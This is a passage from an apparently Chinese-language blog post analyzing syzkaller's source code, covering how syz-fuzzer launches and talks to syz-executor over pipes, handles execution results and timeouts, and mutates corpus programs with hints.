*/</span><br><span class="hljs-keyword">if</span> err0 != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">/* 出错，关闭 executor */</span><br>env.cmd.<span class="hljs-built_in">close</span>()<br>env.cmd = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span><br>&#125;<br><br>info, err0 = env.parseOutput(p, opts)<br><span class="hljs-keyword">if</span> info != <span class="hljs-literal">nil</span> &amp;&amp; env.config.Flags&amp;FlagSignal == <span class="hljs-number">0</span> &#123;<br>addFallbackSignal(p, info)<br>&#125;<br><span class="hljs-keyword">if</span> !env.config.UseForkServer &#123;<br>env.cmd.<span class="hljs-built_in">close</span>()<br>env.cmd = <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="【核心】makeCommand-：建立通信管道，启动-syz-executor"><a href="#【核心】makeCommand-：建立通信管道，启动-syz-executor" class="headerlink" title="【核心】makeCommand()：建立通信管道，启动 syz-executor"></a>【核心】makeCommand()：建立通信管道，启动 syz-executor</h4><p><code>makeCommand()</code> 函数是真正启动 syz-executor 的函数，其首先会先创建一个临时文件夹 <code>syzkaller-testdir</code> 并更改权限为 <code>0777</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeCommand</span><span class="hljs-params">(pid <span class="hljs-type">int</span>, bin []<span class="hljs-type">string</span>, config *Config, inFile, outFile *os.File, outmem []<span class="hljs-type">byte</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">tmpDirPath <span class="hljs-type">string</span>)</span></span> (*command, <span class="hljs-type">error</span>) &#123;<br>dir, err := os.MkdirTemp(tmpDirPath, <span class="hljs-string">&quot;syzkaller-testdir&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create temp dir: %v&quot;</span>, err)<br>&#125;<br>dir = osutil.Abs(dir)<br><br>timeout := config.Timeouts.Program<br><span class="hljs-keyword">if</span> config.UseForkServer &#123;<br><span class="hljs-comment">// 在启用了 fork server 时，Executor 有一个内部的 timeout，可以防止大部分的挂起，</span><br><span class="hljs-comment">// 因此我们用一个非常大的 timeout. Executor 可以因为命名空间中的全局锁与其他东西而变慢，</span><br><span class="hljs-comment">// 故我们最好等待，而非上报虚假的误导性 crashes.</span><br>timeout *= <span class="hljs-number">10</span><br>&#125;<br><br>c := &amp;command&#123;<br>pid:     pid,<br>config:  config,<br>timeout: timeout,<br>dir:     dir,<br>outmem:  outmem,<br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> c != <span class="hljs-literal">nil</span> &#123;<br>c.<span class="hljs-built_in">close</span>()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">if</span> err := os.Chmod(dir, <span class="hljs-number">0777</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to chmod temp dir: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来创建三个用以与 <code>syz-executor</code> 通信的管道，分别用于捕获输出、向 executor 传递命令、从 executor 接收命令：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Output 捕获管道.</span><br>rp, wp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> wp.Close()<br><br><span class="hljs-comment">// executor-&gt;ipc 命令管道.</span><br>inrp, inwp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inwp.Close()<br>c.inrp = inrp<br><br><span class="hljs-comment">// ipc-&gt;executor 命令管道.</span><br>outrp, outwp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> outrp.Close()<br>c.outwp = outwp<br><br>c.readDone = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>接下来会调用 <code>osutil</code> 中的 <code>Command()</code> 创建一个 <code>exec.Cmd</code> 实例（该函数为 golag 原生的 <code>exec.Command()</code> 的 wrapper），executor 实际上要等到后面显式调用 <code>Start()</code> 或 <code>Run()</code> 才正式开始运行（参见<a href="https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter10/10.1.html">创建进程 · Go语言标准库</a>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">cmd := osutil.Command(bin[<span class="hljs-number">0</span>], bin[<span class="hljs-number">1</span>:]...)<br><span class="hljs-keyword">if</span> inFile != <span class="hljs-literal">nil</span> &amp;&amp; outFile != <span class="hljs-literal">nil</span> &#123;<br>cmd.ExtraFiles = []*os.File&#123;inFile, outFile&#125;<br>&#125;<br>cmd.Dir = dir<br><span class="hljs-comment">// Tell ASAN to not mess with our NONFAILING.</span><br>cmd.Env = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>([]<span class="hljs-type">string</span>&#123;&#125;, os.Environ()...), <span class="hljs-string">&quot;ASAN_OPTIONS=handle_segv=0 allow_user_segv_handler=1&quot;</span>)<br>cmd.Stdin = outrp<br>cmd.Stdout = inwp<br></code></pre></td></tr></table></figure><p>若是未设置 <code>FlagDebug</code> 则还会启动一个新的协程持续读取 syz-executor 输出管道中的内容：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> config.Flags&amp;FlagDebug != <span class="hljs-number">0</span> &#123;<br><span class="hljs-built_in">close</span>(c.readDone)<br>cmd.Stderr = os.Stdout<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cmd.Stderr = wp<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *command)</span></span> &#123;<br><span class="hljs-comment">// 读出输出以防 executor 持续地打印一些东西。</span><br><span class="hljs-keyword">const</span> bufSize = <span class="hljs-number">128</span> &lt;&lt; <span class="hljs-number">10</span><br>output := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, bufSize)<br><span class="hljs-keyword">var</span> size <span class="hljs-type">uint64</span><br><span class="hljs-keyword">for</span> &#123;<br>n, err := rp.Read(output[size:])<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">0</span> &#123;<br>size += <span class="hljs-type">uint64</span>(n)<br><span class="hljs-keyword">if</span> size &gt;= bufSize*<span class="hljs-number">3</span>/<span class="hljs-number">4</span> &#123;<br><span class="hljs-built_in">copy</span>(output, output[size-bufSize/<span class="hljs-number">2</span>:size])<br>size = bufSize / <span class="hljs-number">2</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>rp.Close()<br>c.readDone &lt;- output[:size]<br><span class="hljs-built_in">close</span>(c.readDone)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;(c)<br>&#125;<br></code></pre></td></tr></table></figure><p>最后调用 <code>cmd.Start()</code> 真正启动 syz-executor（该方法不会阻塞父进程），并启动一个新的协程等待 syz-executor 的退出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err := cmd.Start(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to start executor binary: %v&quot;</span>, err)<br>&#125;<br>c.exited = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, <span class="hljs-number">1</span>)<br>c.cmd = cmd<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *command)</span></span> &#123;<br>err := c.cmd.Wait()<br>c.exited &lt;- err<br><span class="hljs-built_in">close</span>(c.exited)<br><span class="hljs-comment">// 若 cmd.Stderr 已被泄露给另一个活动进程，防止 livelock.</span><br>rp.SetDeadline(time.Now().Add(<span class="hljs-number">5</span> * time.Second))<br>&#125;(c)<br>wp.Close()<br><span class="hljs-comment">// 注意: 尽管我们在上面 defer 了，我们在调用🤝前明确地关闭 inwp.</span><br><span class="hljs-comment">// 若我们不这么做且 executor 在写入🤝答复前退出了,</span><br><span class="hljs-comment">// 由于我们持有另一个打开的管道末端，从 inrp 上读取将挂起.</span><br>inwp.Close()<br><br><span class="hljs-keyword">if</span> c.config.UseForkServer &#123;<br><span class="hljs-keyword">if</span> err := c.handshake(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>tmp := c<br>c = <span class="hljs-literal">nil</span> <span class="hljs-comment">// disable defer above</span><br><span class="hljs-keyword">return</span> tmp, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="【核心】cmd-exec-：将单个程序输入传递给-syz-executor-执行"><a href="#【核心】cmd-exec-：将单个程序输入传递给-syz-executor-执行" class="headerlink" title="【核心】cmd.exec()：将单个程序输入传递给 syz-executor 执行"></a>【核心】cmd.exec()：将单个程序输入传递给 syz-executor 执行</h4><p><code>command.exec()</code> 函数用以将一个序列化后的输入传递给 syz-executor 进程执行，传递的方式主要是通过在 <code>makeCommand()</code> 中建立的 <code>ipc→executor</code> 管道完成的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *command)</span></span> exec(opts *ExecOpts, progData []<span class="hljs-type">byte</span>) (output []<span class="hljs-type">byte</span>, hanged <span class="hljs-type">bool</span>, err0 <span class="hljs-type">error</span>) &#123;<br>req := &amp;executeReq&#123;<br>magic:            inMagic,<br>envFlags:         <span class="hljs-type">uint64</span>(c.config.Flags),<br>execFlags:        <span class="hljs-type">uint64</span>(opts.Flags),<br>pid:              <span class="hljs-type">uint64</span>(c.pid),<br>syscallTimeoutMS: <span class="hljs-type">uint64</span>(c.config.Timeouts.Syscall / time.Millisecond),<br>programTimeoutMS: <span class="hljs-type">uint64</span>(c.config.Timeouts.Program / time.Millisecond),<br>slowdownScale:    <span class="hljs-type">uint64</span>(c.config.Timeouts.Scale),<br>progSize:         <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(progData)),<br>&#125;<br>reqData := (*[unsafe.Sizeof(*req)]<span class="hljs-type">byte</span>)(unsafe.Pointer(req))[:]<br><span class="hljs-keyword">if</span> _, err := c.outwp.Write(reqData); err != <span class="hljs-literal">nil</span> &#123;<br>output = &lt;-c.readDone<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: failed to write control pipe: %v&quot;</span>, c.pid, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> progData != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> _, err := c.outwp.Write(progData); err != <span class="hljs-literal">nil</span> &#123;<br>output = &lt;-c.readDone<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: failed to write control pipe: %v&quot;</span>, c.pid, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 在这个点程序已经开始运行了.</span><br></code></pre></td></tr></table></figure><p>对于单个输入程序的传输实际上会先传递一个 <code>executeReq</code> 头部，接下来再传递序列化后的输入程序：</p><p><img src="https://s2.loli.net/2023/04/24/I6od1evyCE3MZWH.png" alt="image.png"></p><p>当数据传递过去之后<strong>输入程序就已经开始执行了</strong>，因此该函数后面的部分就都是对结果的处理；）</p><p>完成数据发送后会启动一个协程定时等待 executor 执行完毕，若超时则会将 executor 给 kill 掉：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br>hang := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>t := time.NewTimer(c.timeout)<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-t.C:<br>c.cmd.Process.Kill()<br>hang &lt;- <span class="hljs-literal">true</span><br><span class="hljs-keyword">case</span> &lt;-done:<br>t.Stop()<br>hang &lt;- <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p>随后是一个无限大循环，从 <code>executor→ipc</code> 管道中读取 syz-executor 的执行结果，同样是一个 header <code>executeReply</code> 带一份数据 <code>callReply</code> ，单次请求可能有多份返回数据因此这里是一个无限循环，通过 <code>executeReply</code> 中的 <code>done</code> 标志位标识结束：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">exitStatus := <span class="hljs-number">-1</span><br>completedCalls := (*<span class="hljs-type">uint32</span>)(unsafe.Pointer(&amp;c.outmem[<span class="hljs-number">0</span>]))<br>outmem := c.outmem[<span class="hljs-number">4</span>:]<br><span class="hljs-keyword">for</span> &#123;<br>reply := &amp;executeReply&#123;&#125;<br>replyData := (*[unsafe.Sizeof(*reply)]<span class="hljs-type">byte</span>)(unsafe.Pointer(reply))[:]<br><span class="hljs-keyword">if</span> _, err := io.ReadFull(c.inrp, replyData); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> reply.magic != outMagic &#123;<br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;executor %v: got bad reply magic 0x%x\n&quot;</span>, c.pid, reply.magic)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">if</span> reply.done != <span class="hljs-number">0</span> &#123;<br>exitStatus = <span class="hljs-type">int</span>(reply.status)<br><span class="hljs-keyword">break</span><br>&#125;<br>callReply := &amp;callReply&#123;&#125;<br>callReplyData := (*[unsafe.Sizeof(*callReply)]<span class="hljs-type">byte</span>)(unsafe.Pointer(callReply))[:]<br><span class="hljs-keyword">if</span> _, err := io.ReadFull(c.inrp, callReplyData); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> callReply.signalSize != <span class="hljs-number">0</span> || callReply.coverSize != <span class="hljs-number">0</span> || callReply.compsSize != <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 暂不支持.</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;executor %v: got call reply with coverage\n&quot;</span>, c.pid)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-built_in">copy</span>(outmem, callReplyData)<br>outmem = outmem[<span class="hljs-built_in">len</span>(callReplyData):]<br>*completedCalls++<br>&#125;<br></code></pre></td></tr></table></figure><p>syz-fuzzer 接收 syz-executor 返回数据的示例如下图所示：</p><p><img src="https://s2.loli.net/2023/04/24/seE43rD2uaXCbwj.png" alt="image.png"></p><p>最后检查本次执行结果，如果说执行结果一切顺利则直接返回，<strong>否则会终止 syz-executor 的继续运行</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">close</span>(done)<br><span class="hljs-keyword">if</span> exitStatus == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Program was OK.</span><br>&lt;-hang<br><span class="hljs-keyword">return</span><br>&#125;<br>c.cmd.Process.Kill()<br>output = &lt;-c.readDone<br><span class="hljs-keyword">if</span> err := c.wait(); &lt;-hang &#123;<br>hanged = <span class="hljs-literal">true</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>output = <span class="hljs-built_in">append</span>(output, err.Error()...)<br>output = <span class="hljs-built_in">append</span>(output, <span class="hljs-string">&#x27;\n&#x27;</span>)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> exitStatus == <span class="hljs-number">-1</span> &#123;<br>exitStatus = osutil.ProcessExitStatus(c.cmd.ProcessState)<br>&#125;<br><span class="hljs-comment">// 忽略其他的所有错误.</span><br><span class="hljs-comment">// 在没有 fork server 的情况下 executor 可以合法地退出 (program contains exit_group),</span><br><span class="hljs-comment">// 在带有 fork server 的情况下若 top process 想要特殊的处理，则其可以带着 statusFail 退出.</span><br><span class="hljs-keyword">if</span> exitStatus == statusFail &#123;<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: exit status %d\n%s&quot;</span>, c.pid, exitStatus, output)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="③-proc-smashInput-：执行并变异刚刚被加入到语料库中的程序【核心】"><a href="#③-proc-smashInput-：执行并变异刚刚被加入到语料库中的程序【核心】" class="headerlink" title="③ proc.smashInput()：执行并变异刚刚被加入到语料库中的程序【核心】"></a>③ proc.smashInput()：执行并变异刚刚被加入到语料库中的程序【核心】</h3><p><code>proc.smashInput()</code> 用以<strong>执行并变异刚刚被加入到语料库中的程序</strong>（即 <code>WorkSmash</code> ）：</p><ul><li>首先检查 <code>faultInjectionEnabled</code> ，若设置了则调用 <code>proc.failCall()</code> <ul><li>该函数用以将一个 fault 注入到程序中，其会循环一百次，设置 <code>newProg.Calls[call].Props.FailNth = nth</code> （<code>newProg</code> 为输入程序的克隆）后调用 <code>proc.executeRaw()</code> 进行执行</li></ul></li><li>接下来检查 <code>comparisonTracingEnabled</code> ，若设置了则调用 <code>proc.executeHintSeed()</code> <strong>使用 hint 进行变异</strong></li><li>随后获取 syz-fuzzer 当前快照，并循环一百次：<strong>调用</strong> <code>prog.Mutate()</code> <strong>将输入程序进行变异后再调用</strong> <code>proc.executeAndCollide()</code> <strong>执行变异后的程序</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> smashInput(item *WorkSmash) &#123;<br><span class="hljs-keyword">if</span> proc.fuzzer.faultInjectionEnabled &amp;&amp; item.call != <span class="hljs-number">-1</span> &#123;<br>proc.failCall(item.p, item.call)<br>&#125;<br><span class="hljs-keyword">if</span> proc.fuzzer.comparisonTracingEnabled &amp;&amp; item.call != <span class="hljs-number">-1</span> &#123;<br>proc.executeHintSeed(item.p, item.call)<br>&#125;<br>fuzzerSnapshot := proc.fuzzer.snapshot()<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>p := item.p.Clone()<br>p.Mutate(proc.rnd, prog.RecommendedCalls, proc.fuzzer.choiceTable, proc.fuzzer.noMutate, fuzzerSnapshot.corpus)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: smash mutated&quot;</span>, proc.pid)<br>proc.executeAndCollide(proc.execOpts, p, ProgNormal, StatSmash)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>变异函数 <code>prog.Mutate()</code> 我们将在下一节中深入分析，本节我们先来看另外两个函数：</p><h4 id="proc-executeHintSeed-：使用-hint-变异程序并执行"><a href="#proc-executeHintSeed-：使用-hint-变异程序并执行" class="headerlink" title="proc.executeHintSeed()：使用 hint 变异程序并执行"></a>proc.executeHintSeed()：使用 hint 变异程序并执行</h4><p>该函数首先会将输入程序执行一次，接下来调用 <code>prog.MutateWithHints</code> 使用执行所得的 CompMap <strong>对输入程序中的一些参数值进行替换</strong>，最后再将该输入程序执行一次：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeHintSeed(p *prog.Prog, call <span class="hljs-type">int</span>) &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: collecting comparisons&quot;</span>, proc.pid)<br><span class="hljs-comment">// 首先执行原始程序以从 KCOV 获取比较值.</span><br>info := proc.execute(proc.execOptsComps, p, ProgNormal, StatSeed)<br><span class="hljs-keyword">if</span> info == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// 接下来为每个系统调用参数于一个比较操作数的匹配对变异原始程序.</span><br><span class="hljs-comment">// 执行每一个这样的变异，以检查是否给出了新的覆盖率.</span><br>p.MutateWithHints(call, info.Calls[call].Comps, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *prog.Prog)</span></span> &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;#%v: executing comparison hint&quot;</span>, proc.pid)<br>proc.execute(proc.execOpts, p, ProgNormal, StatHint)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>MutateWithHints()</code> 当中输入进程会先被克隆一份，接下来使用 <code>ForeachArg</code> 遍历指定系统调用中的每个参数，并传入了一些闭包函数套娃（套中套中套属于是）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 使用存储在 compMaps中的比较操作数变异程序.</span><br><span class="hljs-comment">// 对于每个变种，执行 exec 回调.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Prog)</span></span> MutateWithHints(callIndex <span class="hljs-type">int</span>, comps CompMap, exec <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Prog)</span></span>) &#123;<br>p = p.Clone()<br>c := p.Calls[callIndex]<br>execValidate := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 不要尝试修复 candidate 程序.</span><br><span class="hljs-comment">// 假设原来的调用被 sanitized, 我们会得到一个坏的调用作为 hint 的替代结果，将其丢掉就行.</span><br><span class="hljs-keyword">if</span> p.Target.sanitize(c, <span class="hljs-literal">false</span>) != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>p.debugValidate()<br>exec(p)<br>&#125;<br>ForeachArg(c, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(arg Arg, _ *ArgCtx)</span></span> &#123;<br>generateHints(comps, arg, execValidate)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>类似于我们上文分析的 <code>ForeachType()</code>，<code>ForeachArg()</code> 会为该调用的返回值与每一个参数都调用 <code>foreachArgImpl()</code>，该函数首先会调用上层传入的闭包 <code>generateHints()</code>，接下来会根据参数类型进行不同操作：</p><ul><li><code>GroupArg</code> （逻辑上的一组参数，即<strong>结构体</strong>与<strong>数组</strong>）：获取并遍历其中的每个成员，递归调用 